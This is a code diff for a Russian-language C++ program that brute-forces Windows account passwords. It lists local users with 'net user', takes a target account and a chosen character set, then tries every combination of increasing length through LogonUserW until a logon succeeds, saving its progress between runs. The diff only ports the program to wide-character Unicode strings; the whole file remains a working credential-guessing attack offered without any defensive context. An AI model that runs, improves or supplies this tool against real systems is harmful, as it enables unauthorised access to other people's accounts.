@@ -4,52 +4,63 @@
 #include <fstream>
 #include <ctime>
 #include <windows.h>
-#include <algorithm> // Для std::binary_search и std::sort
+#include <algorithm>
+#include <io.h>
+#include <fcntl.h> // Для _setmode
+
 using namespace std;
 
 clock_t start;
 
-// Функция для попытки входа в систему
-bool attemptLogin(const string& username, const string& password) {
+// Используем Unicode-версию функции LogonUser
+BOOL attemptLogin(const wstring& username, const wstring& password) {
     HANDLE tokenHandle;
-    if (LogonUserA(username.c_str(), NULL, password.c_str(), LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &tokenHandle)) {
-        CloseHandle(tokenHandle);
-        return true; // Успешный вход
-    }
-    return false; // Неудачная попытка
+    BOOL result = LogonUserW(
+        username.c_str(),
+        NULL,
+        password.c_str(),
+        LOGON32_LOGON_INTERACTIVE,
+        LOGON32_PROVIDER_DEFAULT,
+        &tokenHandle
+    );
+
+    if (result) CloseHandle(tokenHandle);
+    return result;
 }
 
-// Функция для генерации всех комбинаций заданной длины
-void generateCombinations(const string& charset, int length, string prefix, const string& username, vector<string>& triedPasswords) {
+// Остальной код оставлен без изменений, кроме типов данных и ввода/вывода
+void generateCombinations(const wstring& charset, int length, wstring prefix, 
+                         const wstring& username, vector<wstring>& triedPasswords) {
     if (length == 0) {
         if (!binary_search(triedPasswords.begin(), triedPasswords.end(), prefix)) {
-            cout << "Попытка № " << triedPasswords.size() + 1 << " для пароля: " << prefix << endl;
+            wcout << L"Попытка № " << triedPasswords.size() + 1 << L" для пароля: " << prefix << endl;
+            
             if (attemptLogin(username, prefix)) {
-                cout << "Успех! Пароль найден: " << prefix << endl;
+                wcout << L"Успех! Пароль найден: " << prefix << endl;
                 clock_t end = clock();
                 double elapsed = static_cast<double>(end - start) / CLOCKS_PER_SEC;
-                cout << "Поиск завершен. Общее время выполнения: " << elapsed << " секунд." << endl;
-                exit(0); // Завершение программы при успешном входе
+                wcout << L"Поиск завершен. Общее время выполнения: " << elapsed << L" секунд." << endl;
+                exit(0);
             } else {
-                triedPasswords.push_back(prefix); // Сохраняем неудачную попытку
+                triedPasswords.push_back(prefix);
             }
         }
         return;
     }
-    for (char c : charset) {
+    
+    for (wchar_t c : charset) {
         generateCombinations(charset, length - 1, prefix + c, username, triedPasswords);
     }
 }
 
-// Функция для загрузки прогресса из файла
-void loadProgress(int& currentLength, vector<string>& triedPasswords, const string& progressFile) {
-    ifstream file(progressFile);
+void loadProgress(int& currentLength, vector<wstring>& triedPasswords, const string& progressFile) {
+    wifstream file(progressFile);
     if (file.is_open()) {
-        string line;
+        wstring line;
         while (getline(file, line)) {
-            if (line.find("length:") == 0) {
+            if (line.find(L"length:") == 0) {
                 currentLength = stoi(line.substr(7));
-            } else if (line.find("password:") == 0) {
+            } else if (line.find(L"password:") == 0) {
                 triedPasswords.push_back(line.substr(9));
             }
         }
@@ -57,82 +68,83 @@ void loadProgress(int& currentLength, vector<string>& triedPasswords, const stri
     }
 }
 
-// Функция для сохранения прогресса в файл
-void saveProgress(int currentLength, const vector<string>& triedPasswords, const string& progressFile) {
-    ofstream file(progressFile);
+void saveProgress(int currentLength, const vector<wstring>& triedPasswords, const string& progressFile) {
+    wofstream file(progressFile);
     if (file.is_open()) {
-        file << "length: " << currentLength << endl;
-        for (const string& password : triedPasswords) {
-            file << "password: " << password << endl;
+        file << L"length: " << currentLength << endl;
+        for (const wstring& password : triedPasswords) {
+            file << L"password: " << password << endl;
         }
         file.close();
     }
 }
 
 int main() {
-    setlocale(LC_ALL, "ru_RU.UTF-8");
+    // Включение поддержки Unicode в консоли
+    _setmode(_fileno(stdin), _O_U16TEXT);
+    _setmode(_fileno(stdout), _O_U16TEXT);
 
-    string username, charset, progressFile = "progress.txt";
-    int minLength = 1; // Минимальная длина пароля
-    vector<string> triedPasswords; // Список уже проверенных паролей
-    int currentLength = minLength; // Текущая длина пароля
+    system("net user");
+    wstring username; // Изменен на wstring
+    wstring charset;  // Изменен на wstring
+    int minLength = 1;
+    vector<wstring> triedPasswords; // Изменен на wstring
+    int currentLength = minLength;
 
-    // Загрузка прогресса
+    string progressFile = "progress.txt";
     loadProgress(currentLength, triedPasswords, progressFile);
 
-    // Ввод имени пользователя
-    cout << "Введите имя учетной записи: ";
-    cin >> username;
+    // Ввод имени пользователя через wcin
+    wcout << L"Введите имя учетной записи: ";
+    wcin >> username;
 
-    // Ввод набора символов для генерации паролей
-    // Набор символов для генерации паролей
-    vector<string> req_types = {"Цифры", "Латинские буквы", "Русские буквы", "Специальные символы"};
-    string digits;
-    int level = 1; // Текущий уровень
+    vector<wstring> req_types = { // Изменен на wstring
+        L"Цифры (y/n): ",
+        L"Латинские буквы (y/n): ",
+        L"Русские буквы (y/n): ",
+        L"Спецсимволы (y/n): "
+    };
 
+    int level = 1;
     while (true) {
-        if (level > 4) { // Если достигнут последний уровень, выходим из цикла
+        if (level > 4) {
             break;
         }
 
-        cout << req_types[level - 1] << " (y/n): ";
-        getline(cin >> ws, digits); // Считываем строку с клавиатуры
+        wcout << req_types[level - 1]; // Используется wcout
+        wstring digits; // Изменен на wstring
+        getline(wcin >> ws, digits); // Используется wcin
 
-        if (digits == "y" || digits == "Y" || digits == "д" || digits == "Д") {
+        if (digits == L"y" || digits == L"Y" || digits == L"д" || digits == L"Д") {
             if (level == 1) {
-                charset += "0123456789"; // Добавляем цифры
+                charset += L"0123456789"; // Добавлен префикс L для Unicode
             } else if (level == 2) {
-                charset += "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"; // Добавляем латинские буквы
+                charset += L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
             } else if (level == 3) {
-                charset += "абвгдеёжзийклмнопрстуфхцчшщъыьэюяАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ"; // Добавляем русские буквы
+                charset += L"абвгдеёжзийклмнопрстуфхцчшщъыьэюяАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ";
             } else if (level == 4) {
-                charset += "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"; // Добавляем специальные символы
+                charset += L"!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";
             }
-            level++; // Переходим к следующему уровню
-        } else if (digits == "n" || digits == "N" || digits == "н" || digits == "Н") {
-            level++; // Пропускаем текущий уровень
+            level++;
+        } else if (digits == L"n" || digits == L"N" || digits == L"н" || digits == L"Н") {
+            level++;
         } else {
-            cout << "Вы неправильно ввели! Введите 'y' или 'n'." << endl;
+            wcout << L"Вы неправильно ввели! Введите 'y' или 'n'." << endl;
             if (level > 1) {
-                level--; // Возвращаемся на предыдущий уровень
+                level--;
             }
         }
     }
-    
-
-
 
     start = clock();
 
-    // Сортировка уже проверенных паролей для быстрого поиска
     sort(triedPasswords.begin(), triedPasswords.end());
 
-    // Генерация и проверка паролей
-    while (true) { // Бесконечный цикл, пока пароль не найден
-        cout << "Начинаю проверку паролей длиной " << currentLength << " символов..." << endl;
-        generateCombinations(charset, currentLength, "", username, triedPasswords);
-        saveProgress(currentLength + 1, triedPasswords, progressFile); // Сохранение прогресса
-        currentLength++; // Увеличиваем длину для следующей итерации
+    while (true) {
+        wcout << L"Начинаю проверку паролей длиной " << currentLength << L" символов..." << endl;
+        generateCombinations(charset, currentLength, L"", username, triedPasswords);
+        saveProgress(currentLength + 1, triedPasswords, progressFile);
+        currentLength++;
     }
 
     return 0;
